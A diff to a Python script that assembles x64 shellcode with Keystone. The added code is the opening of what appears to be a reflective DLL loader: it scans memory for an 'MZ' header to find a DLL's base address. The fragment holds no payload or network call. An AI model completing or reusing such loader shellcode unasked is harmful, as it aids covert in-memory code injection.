@@ -1,6 +1,23 @@
 import ctypes, struct
 from keystone import *
-CODE = ( )
+CODE = (
+    "start:                              "
+    "   int3                            ;"
+    "   push rbp                        ;"
+    "   mov rbp, rsp                    ;"
+    "   add rsp, 0xfffffffffffffdf8     ;"  # Make some space in stack
+    #STEP 0 : calculate dll images current base address
+    "find_dllstart:                       "
+    "   lea rsi, [rip+dll_base]         ;"  # Trying to get address of end of this shellcode
+    "   mov rax, 0x5a4d                 ;"
+    "dll_compare:                        "
+    "   inc rsi                         ;"  # Increment the loop counter
+    "   mov rdi, rsi                    ;"
+    "   scasw                           ;"  # compares the content of the AX register to the word addressed by DI
+    "   jne dll_compare                 ;"
+    "dll_base_found:                     "
+    "   mov r12, rsi                    ;"  # R12 has DLL base address
+ )
 
 ks = Ks(KS_ARCH_X86, KS_MODE_64)
 encoding, count = ks.asm(CODE)
